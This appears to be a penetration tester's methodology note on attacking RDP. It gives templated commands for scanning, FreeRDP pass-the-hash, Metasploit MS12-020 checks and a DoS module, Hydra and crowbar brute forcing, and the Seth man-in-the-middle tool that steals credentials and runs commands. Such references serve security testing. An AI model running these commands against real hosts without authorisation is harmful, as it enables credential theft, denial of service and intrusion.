# RDP - Methodology

### Overview

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft,
which provides a user with a graphical interface to connect to another computer
over a network connection.

The user employs RDP client software for this purpose, while the other computer
must run RDP server software.

RDP authentication mechanism rely on Windows local or Active Directory domain
credentials.

RDP may uses Network Level Authentication (NLA, RDP 6.0 and supported initially
in Windows Vista / Windows Server 2008) which requires the connecting user to
authenticate before a session is established with the server and prevents the
use of resources on the server from the load of the graphical login screen.

### Network scan

Nmap can be used to scan the network for RDP services:

```
nmap -v -p 3389 -A -oA nmap_rdp <RANGE/CIDR>
```

### RDP clients

###### Windows

On Windows, the default Microsoft Remote Desktop application
("Connexion Bureau à distance") or the Remote Desktop Manager third party
application can be used as RDP clients.

The Remote Desktop Manager allows for the configuration and storing of
multiples RDP connection (host and authentication information). A Free Edition
is available as well as a commercial grade Enterprise Edition.

###### Linux

On Linux, rdesktop or Remmina (GUI) can be used as RDP clients.

```
rdesktop [options] server[:port]
Remmina
```

### Pass-the-hash

FreeRDP can be used to authenticate using the hash through RDP against hosts
using the Restricted Admin mode feature.

```
xfreerdp /u:<USERNAME> /d:<DOMAIN> /pth:<HASH> /v:<HOST | IP>
```

### Known vulnerabilities

Nmap and metasploit can be used to check for the following exploits:

```
# CVE-2012-0002 / MS12-020
nmap -v -p 3389 --script rdp-vuln-ms12-020 <HOST>
msf> use auxiliary/scanner/rdp/ms12_020_check
```

###### CVE-2012-0002 / MS12-020

The CVE-2012-0002 / MS12-020 vulnerability can be used both to realize a Denial
Of Service and remotely execute code on the target.

A metasploit module is available to realize a DoS of the target:

```
msf> use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
```

As of december 2018, no public proof-of-concept code that results in remote
code execution is available.

### Authentication brute force

The local or Active Directory domain account lockout policies apply
(depending on the type of authentication tried) when connecting with RDP.
Vertical brute forcing is thus not possible.

However, horizontal RDP brute forcing can be used for lateral movement once
an account has been compromised. Indeed, the compromised account may not be an
local Administrator (and thus can not connect through PsExec like tool) but can
be a member of the Remote Desktop Users group.

Patator, Hydra or the crowbar Python Script can be used to brute force RDP
access. Patator and crowbar both support NLA (as of December 2018, Patator does
not support no NLA RDP brute force).

```
python crowbar.py -b rdp (-u <USERNAME | <DOMAIN\\USERNAME> | -U USERNAME_FILE) (-c <PASSWORD> | -C <PASSWORDS_LIST) -s <CIDR>

hydra -t 1 -V -l <USERNAME> (-p <PASSWORD> | -P <PASSWORDS_LIST) rdp://<IP | HOST>
```

### Man-in-the-middle attack

Seth is a tool written in Python and Bash to MitM RDP connections that
attempts to downgrade the connection in order to extract clear text credentials.

Seth can be used regardless if Network Level Authentication (NLA) is enabled
on the RDP host.

Seth will notably:
  - Spoof ARP replies to redirect traffic from the victim host to the attacker
  machine and then to the target RDP server.
  - Configure an iptable rule to reject SYN packet to prevent direct RDP
  authentication.
  - Clone the SSL certificate (only replacing the public key and signature)
  - Block traffic to port 88 to downgrade Kerberos authentication to NTLM.

Note that the user will be presented with a certificate error warning that must
be accepted before the clear text credentials are sent.

In case of a successful attack:

  - Clear text credentials of the user login in are obtained
  - A command can be executed on the targeted host
  - Victim keyboard inputs are retrieved

Usage:

```
# Unless the RDP host is on the same subnet as the victim machine, the last IP address must be that of the gateway.
# The COMMAND is executed on the RDP host by simulating WIN+R
# The COMMAND should not contains special characters (powershell -enc <STRING> can be used)

seth.sh <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP | HOST_IP> [<COMMAND>]
```

### Session Hijacking

If Administrator / SYSTEM privileges could be obtained on a host, RDP sessions
of others users can be hijacked. This could be used to access the
host as the hijacked user through a GUI interface with out knowing its password.  

To hijack RDP session refer to the [Windows] Post Exploitation note.
